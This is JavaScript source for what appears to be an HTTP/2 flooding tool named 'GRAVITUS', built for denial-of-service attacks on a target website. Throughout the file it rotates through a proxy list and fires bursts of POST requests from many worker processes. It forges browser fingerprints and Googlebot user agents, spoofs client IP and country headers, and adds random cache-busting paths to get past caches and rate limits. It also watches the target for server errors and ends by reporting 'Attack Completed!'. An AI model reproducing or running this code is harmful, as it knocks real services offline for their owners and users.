const control_header = ["max-age=604800", "proxy-revalidate", "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", "s-maxage=604800", "max-stale", "public, immutable, max-age=31536000", "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", "max-age=31536000,public", "min-fresh", "private", "public", "s-maxage", "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", "no-transform", "max-age=31557600", "stale-if-error", "only-if-cached", "max-age=0", "must-understand, no-store", "max-age=31536000; includeSubDomains", "max-age=31536000; includeSubDomains; preload", "max-age=120", "max-age=0,no-cache,no-store,must-revalidate", "public, max-age=604800, immutable", "max-age=0, must-revalidate, private", "max-age=0, private, must-revalidate", "max-age=604800, stale-while-revalidate=86400", "max-stale=3600", "public, max-age=2678400", "min-fresh=600", "public, max-age=30672000", "max-age=31536000, immutable", "max-age=604800, stale-if-error=86400", "public, max-age=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "o-cache, no-store, must-revalidate, pre-check=0, post-check=0", "public, s-maxage=600, max-age=60", "public, max-age=31536000", "max-age=14400, public", "max-age=14400", "max-age=600, private", "public, s-maxage=600, max-age=60", "no-store, no-cache, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "X-Access-Control: Allow-Origin", "Cache-Control: no-cache, no-store, must-revalidate", "Authorization: Bearer your_token", "Content-Control: no-transform", "X-RateLimit-Limit: 1000", "Proxy-Connection: keep-alive", "X-Frame-Options: SAMEORIGIN", "Strict-Transport-Security: max-age=31536000; includeSubDomains", "X-Content-Type-Options: nosniff", "Retry-After: 120", "Connection: close", "Accept-Ranges: bytes", "ETag: \"33a64df551425fcc55e4d42a148795d9f25f89d4\"", "X-DNS-Prefetch-Control: off", "Expires: Thu, 01 Jan 1970 00:00:00 GMT", "X-Download-Options: noopen", "X-Permitted-Cross-Domain-Policies: none", "X-Frame-Options: DENY", "Expect-CT: max-age=86400, enforce", "Upgrade-Insecure-Requests: 1", "X-Forwarded-Proto: https", "Access-Control-Allow-Origin: *", "X-Content-Duration: 3600", "Alt-Svc: h3=\":443\"", "X-XSS-Protection: 1; mode=block", "Referrer-Policy: no-referrer", "X-Pingback: /xmlrpc.php", "Content-Encoding: gzip", "Age: 3600", "X-Clacks-Overhead: GNU Terry Pratchett", "Server: Apache/2.4.41 (Unix)", "X-Powered-By: PHP/7.4.3", "Allow: GET, POST, HEAD", "Retry-After: 3600", "Access-Control-Allow-Methods: GET, POST, OPTIONS", "X-UA-Compatible: IE=edge", "Public-Key-Pins: max-age=5184000; pin-sha256=\"base64+primary==\"; pin-sha256=\"base64+backup==\"; includeSubDomains; report-uri=\"https://example.com/hpkp-report\"", "Content-Language: en-US", "X-Permitted-Cross-Domain-Policies: none", "Strict-Transport-Security: max-age=15768000; includeSubDomains", "Access-Control-Allow-Headers: Content-Type", "X-Frame-Options: ALLOW-FROM https://example.com/", "X-Robots-Tag: noindex, nofollow", "Access-Control-Max-Age: 3600", "X-Cache-Status: MISS", "Vary: Accept-Encoding", "X-GeoIP-Country-Code: US", "X-Do-Not-Track: 1", "X-Request-ID: 12345", "X-Correlation-ID: abcde", "DNT: 1", "X-Device-Type: mobile", "X-Device-OS: Android", "X-Device-Model: Galaxy S10", "X-App-Version: 2.1.0", "X-User-ID: 123", "X-Session-ID: xyz", "X-Feature-Flag: new_feature_enabled", "X-Experiment-ID: experiment_123", "X-Ab-Test: variant_b", "X-Tracking-Consent: accepted", "X-Customer-Segment: premium", "X-User-Role: admin", "X-Client-ID: client_567", "X-Internal-Request: true", "X-Service-Name: backend-api", "X-Backend-Server: server-1", "X-Database-Query: SELECT * FROM users", "X-Cache-Control: no-store", "X-Environment: production", "X-Debug-Mode: false", "X-Remote-IP: 203.0.113.195", "X-Proxy: true", "X-Origin: https://www.example.com", "X-FastCGI-Cache: HIT", "X-Pagination-Total: 1000", "X-Pagination-Page: 5", "X-Pagination-Limit: 20", "X-Notification-Count: 3", "X-Message-ID: msg_123", "X-Notification-Type: alert", "X-Notification-Priority: high", "X-Queue-Depth: 50", "X-Queue-Position: 10", "X-Queue-Status: active", "X-Content-Hash: sha256=abcdef123456", "X-Resource-ID: resource_789", "X-Resource-Type: article", "X-Transaction-ID: tx_456", "X-Transaction-Status: success", "X-Transaction-Amount: $100.00", "X-Transaction-Currency: USD", "X-Transaction-Date: 2024-01-24T12:00:00Z", "X-Payment-Method: credit_card", "X-Payment-Status: authorized", "X-Shipping-Method: express", "X-Shipping-Cost: $10.00", "X-Subscription-Status: active", "X-Subscription-Type: premium", "Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64"];
const cplist = ["ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-SHA", "TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256"];
const country_codes = ["A1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU", "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO", "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB", "GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW", "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS", "IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF", "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA", "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO", "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN", "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL", "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"];
const referer_hosts = ["google.com", "youtube.com", "facebook.com", "baidu.com", "wikipedia.org", "x.com", "amazon.com", "yahoo.com", "reddit.com", "netflix.com", "cloudflare.com", "firefox.com", "opera.com", "brave.com", "mozilla.org", "tiktok.com"];
class NetSocket {
  constructor() {}
  async ["HTTP"](_0x205e55, _0x70535b) {
    const levaughn = "CONNECT " + _0x205e55.address + ":443 HTTP/1.1\r\nHost: " + _0x205e55.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const annaclaire = new Buffer.from(levaughn);
    const aamir = {
      host: _0x205e55.host,
      port: _0x205e55.port
    };
    const charna = await net.connect(aamir);
    charna.setTimeout(_0x205e55.timeout * 6e5);
    charna.setKeepAlive(true, 1e5);
    charna.on("connect", () => {
      charna.write(annaclaire);
    });
    charna.on("data", yaselin => {
      const demetricus = yaselin.toString("utf-8");
      const shyanne = demetricus.includes("HTTP/1.1 200");
      if (shyanne === false) {
        charna.destroy();
        return _0x70535b(undefined, "error: invalid response from proxy server");
      }
      return _0x70535b(charna, undefined);
    });
    charna.on("timeout", () => {
      charna.destroy();
      return _0x70535b(undefined, "error: timeout exceeded");
    });
    charna.on("error", () => {
      charna.destroy();
      return _0x70535b(undefined, "error: connection error");
    });
  }
}
const Socker = new NetSocket();
const version = randomIntn(126, 134);
let brandValue;
let fullVersion;
switch (version) {
  case 126:
    brandValue = "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"" + version + "\", \"Google Chrome\";v=\"" + version + "\"";
    fullVersion = version + ".0." + randomIntn(6610, 6790) + "." + randomIntn(10, 100);
    break;
  case 127:
    brandValue = "\"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"" + version + "\", \"Google Chrome\";v=\"" + version + "\"";
    fullVersion = version + ".0." + randomIntn(6610, 6790) + "." + randomIntn(10, 100);
    break;
  case 128:
    brandValue = "\"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"" + version + "\", \"Google Chrome\";v=\"" + version + "\"";
    fullVersion = version + ".0." + randomIntn(6610, 6790) + "." + randomIntn(10, 100);
    break;
  case 129:
    brandValue = "\"Google Chrome\";v=\"" + version + "\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"" + version + "\"";
    fullVersion = version + ".0." + randomIntn(6610, 6790) + "." + randomIntn(10, 100);
    break;
  case 130:
    brandValue = "\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"" + version + "\", \"Google Chrome\";v=\"" + version + "\"";
    fullVersion = version + ".0." + randomIntn(6610, 6790) + "." + randomIntn(10, 100);
    break;
  case 131:
    brandValue = "\"Google Chrome\";v=\"" + version + "\", \"Chromium\";v=\"" + version + "\", \"Not_A Brand\";v=\"24\"";
    fullVersion = version + ".0." + randomIntn(6610, 6790) + "." + randomIntn(10, 100);
    break;
  case 132:
    brandValue = "\"Google Chrome\";v=\"" + version + "\", \"Chromium\";v=\"" + version + "\", \"Not_A Brand\";v=\"8\"";
    fullVersion = version + ".0." + randomIntn(6610, 6790) + "." + randomIntn(10, 100);
    break;
  case 133:
    brandValue = "\"Google Chrome\";v=\"" + version + "\", \"Chromium\";v=\"" + version + "\", \"Not_A Brand\";v=\"99\"";
    fullVersion = version + ".0." + randomIntn(6610, 6790) + "." + randomIntn(10, 100);
    break;
  case 134:
    brandValue = "\"Google Chrome\";v=\"" + version + "\", \"Chromium\";v=\"" + version + "\", \"Not_A Brand\";v=\"24\"";
    fullVersion = version + ".0." + randomIntn(6610, 6790) + "." + randomIntn(10, 100);
    break;
  default:
    brandValue = "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"" + version + "\", \"Google Chrome\";v=\"" + version + "\"";
    fullVersion = version + ".0." + randomIntn(6610, 6790) + "." + randomIntn(10, 100);
}
const platforms = ["Windows", "Macintosh", "Linux", "Android", "PlayStation 4", "iPhone", "iPad", "Windows Phone", "iOS", "Android", "PlayStation 5", "Xbox One", "Nintendo Switch", "Apple TV", "Amazon Fire TV", "Roku", "Chromecast", "Smart TV", "Other"];
const platform = platforms[randomIntn(0, platforms.length)];
let secChUaPlatform;
let platformVersion;
switch (platform) {
  case "Windows":
    secChUaPlatform = "\"Windows\"";
    platformVersion = "\"10.0.0\"";
    break;
  case "Linux":
    secChUaPlatform = "\"Linux\"";
    platformVersion = "\"5.15.0\"";
    break;
  default:
    secChUaPlatform = "\"Windows\"";
    platformVersion = "\"10.0.0\"";
}
async function monitorTarget() {
  try {
    const nelse = await axios.get(args.target, {
      timeout: 3e3,
      validateStatus: () => true,
      headers: {
        "User-Agent": process.argv.includes("--bfm") ? googleBotAgents[randomIntn(0, googleBotAgents.length)] : userAgents[randomIntn(0, userAgents.length)]
      }
    });
    if (nelse.status === 200) {
      const ayaz = nelse.data.match(/<title>(.*?)<\/title>/i);
      const argle = ayaz ? ayaz[1].substring(0, 50) : "No title";
      console.log("[32m" + ("[GRAVITUS] OK (200) | Title: \"" + argle + "\"") + "[0m");
    } else {
      if (nelse.status >= 500) {
        console.log("[33m" + ("[GRAVITUS] Status " + nelse.status + " | HEHE Server Error") + "[0m");
      } else {
        console.log("[33m" + ("[GRAVITUS] Status " + nelse.status + " | Responding") + "[0m");
      }
    }
  } catch (desia) {
    if (desia.code === "ECONNABORTED" || desia.code === "ETIMEDOUT") {
      console.log("[31m[GRAVITUS] Timeout | HEHE[0m");
    } else {
      if (desia.code === "ENETUNREACH") {
        console.log("[31m[GRAVITUS] No Connection[0m");
      } else {
        if (desia.response && desia.response.status >= 500) {
          console.log("[35m" + ("[GRAVITUS] Error: " + desia.response.status + " | HEHE Server Error") + "[0m");
        } else {
          if (desia.response) {
            console.log("[35m" + ("[GRAVITUS] Error: " + desia.response.status + " | Responding") + "[0m");
          }
        }
      }
    }
  }
}
function runFlooder() {
  const milos = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
  const oluwayemisi = milos[randomIntn(0, milos.length)];
  const federica = oluwayemisi.split(":");
  const khrissa = {
    host: federica[0],
    port: ~~federica[1],
    address: parsedUrl.host + ":443",
    timeout: 100
  };
  let waqas = parsedUrl.path;
  if (process.argv.includes("--ratelimit")) {
    waqas += "?robots.txt=" + randstr(30) + "_" + randstr(12) + "-" + timestampString + "-0-gaNy" + randstr(8);
  } else {
    waqas += "?cachebuster=" + randstr(16);
  }
  let tiwana = userAgents[randomIntn(0, userAgents.length)];
  if (process.argv.includes("--bfm")) {
    tiwana = googleBotAgents[randomIntn(0, googleBotAgents.length)];
  }
  let saramarie = parsedUrl.host;
  if (process.argv.includes("--origin")) {
    saramarie = "https://www." + referer_hosts[randomIntn(0, referer_hosts.length)] + "/" + generateRandomString(5, 15);
  }
  let banita = {};
  if (process.argv.includes("--cache")) {
    banita = {
      "Cache-Control": "max-age=0",
      "X-Cache": Math.random() > 0.5 ? "HIT" : "MISS"
    };
  } else {
    const burdene = {
      "Cache-Control": "no-store, no-cache, must-revalidate"
    };
    banita = burdene;
  }
  let mendie = {};
  if (process.argv.includes("--spoof")) {
    mendie = {
      "If-Modified-Since": httpTime,
      "If-None-Match": "\"" + randstr(20) + "+" + randstr(6) + "=\"",
      "X-Country-Code": country_codes[randomIntn(0, country_codes.length)],
      "X-Forwarded-Proto": "https",
      "x-client-session": "true",
      "x-real-ip": federica[0]
    };
  }
  const myoni = {
    ":method": "POST",
    ":authority": parsedUrl.host,
    ":path": waqas,
    ":scheme": "https",
    accept: accept_header[randomIntn(0, accept_header.length)],
    "accept-language": language_header[randomIntn(0, language_header.length)],
    "accept-encoding": encoding_header[randomIntn(0, encoding_header.length)],
    "sec-fetch-site": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-dest": "document",
    "sec-fetch-user": "?1",
    "user-agent": tiwana,
    "sec-ch-ua": brandValue,
    "sec-ch-ua-platform": secChUaPlatform,
    "sec-ch-ua-mobile": "?0",
    "upgrade-insecure-requests": "1",
    referer: saramarie,
    cookie: "session=" + randstr(12),
    DNT: "1",
    "Max-Forwards": "0",
    "Accept-Ch": "DPR, Width, Viewport-Width, Downlink, Save-data",
    "cache-control": "no-cache, must-revalidate, max-age=0",
    pragma: "no-cache",
    "X-Bypass-Cache": "true",
    ...banita,
    ...mendie
  };
  Socker.HTTP(khrissa, async (yaribeth, eryanna) => {
    if (eryanna) {
      return;
    }
    yaribeth.setKeepAlive(true, 6e5);
    const oras = {
      rejectUnauthorized: false,
      host: parsedUrl.host,
      servername: parsedUrl.host,
      socket: yaribeth,
      ecdhCurve: "prime256v1:secp384r1",
      ciphers: cplist[randomIntn(0, cplist.length)],
      secureProtocol: "TLS_method",
      ALPNProtocols: ["http/1.1", "h2"]
    };
    const armony = await tls.connect(443, parsedUrl.host, oras);
    armony.setKeepAlive(true, 6e4);
    const nolon = await http2.connect(parsedUrl.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1e3,
        initialWindowSize: Math.random() < 0.5 ? 6291456 : 2097152,
        maxHeaderListSize: 262144,
        enablePush: false
      },
      maxSessionMemory: 3333,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => armony,
      socket: yaribeth
    });
    nolon.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 1e3,
      initialWindowSize: Math.random() < 0.5 ? 6291456 : 2097152,
      maxHeaderListSize: 262144,
      enablePush: false
    });
    nolon.on("connect", () => {
      const kameal = setInterval(() => {
        for (let naithen = 0; naithen < args.Rate; naithen++) {
          const lucio = {
            ...myoni,
            "user-agent": process.argv.includes("--bfm") ? googleBotAgents[randomIntn(0, googleBotAgents.length)] : userAgents[randomIntn(0, userAgents.length)],
            accept: accept_header[randomIntn(0, accept_header.length)],
            "accept-language": language_header[randomIntn(0, language_header.length)],
            "accept-encoding": encoding_header[randomIntn(0, encoding_header.length)],
            "cache-control": control_header[randomIntn(0, control_header.length)],
            ":path": process.argv.includes("--ratelimit") ? parsedUrl.path + "?robots.txt=" + randstr(30) + "_" + randstr(12) + "-" + timestampString + "-0-gaNy" + randstr(8) : parsedUrl.path + "?cachebuster=" + randstr(16),
            cookie: "session=" + randstr(12)
          };
          const marcalene = nolon.request(lucio);
          marcalene.on("response", () => {
            marcalene.close();
            marcalene.destroy();
          });
          marcalene.on("error", () => {
            marcalene.destroy();
          });
          marcalene.end();
        }
      }, 700);
      nolon.on("close", () => {
        clearInterval(kameal);
        nolon.destroy();
        armony.destroy();
        yaribeth.destroy();
        runFlooder();
      });
      nolon.on("error", () => {
        clearInterval(kameal);
        nolon.destroy();
        armony.destroy();
        yaribeth.destroy();
        runFlooder();
      });
    });
  });
}
if (cluster.isMaster) {
  showBanner();
  console.log("[36m┌───────────────── System Information ────────────────┐[0m");
  console.log("[36m" + ("│ [1mTarget: [37m" + args.target.padEnd(35) + " │") + "[0m");
  console.log("[36m" + ("│ [1mDuration: [37m" + args.time + " seconds" + " ".repeat(25 - args.time.toString().length) + " │") + "[0m");
  console.log("[36m" + ("│ [1mRate: [37m" + args.Rate + " req/700ms" + " ".repeat(26 - args.Rate.toString().length) + " │") + "[0m");
  console.log("[36m" + ("│ [1mThreads: [37m" + args.threads + " ".repeat(33 - args.threads.toString().length) + " │") + "[0m");
  console.log("[36m" + ("│ [1mProxy File: [37m" + args.proxyFile.padEnd(31) + " │") + "[0m");
  console.log("[36m└─────────────────────────────────────────────────────┘[0m");
  const monitor = setInterval(monitorTarget, 2e3);
  monitorTarget();
  const restartScript = () => {
    for (const latrinia in cluster.workers) {
      cluster.workers[latrinia].kill();
    }
    console.log("[33m[>] Restarting in 1000 ms...[0m");
    setTimeout(() => {
      for (let yolette = 1; yolette <= args.threads; yolette++) {
        cluster.fork();
      }
    }, 1e3);
  };
  const handleRAMUsage = () => {
    const mariesha = os.totalmem();
    const daejanae = mariesha - os.freemem();
    const jeniva = daejanae / mariesha * 100;
    if (jeniva >= 90) {
      console.log("[33m" + ("[!] RAM Usage: " + jeniva.toFixed(2) + "%") + "[0m");
      restartScript();
    }
  };
  setInterval(handleRAMUsage, 5e3);
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
  setTimeout(() => {
    clearInterval(monitor);
    console.log("[32m[✓] Attack Completed![0m");
    process.exit(0);
  }, args.time * 1e3);
} else {
  setInterval(runFlooder);
}
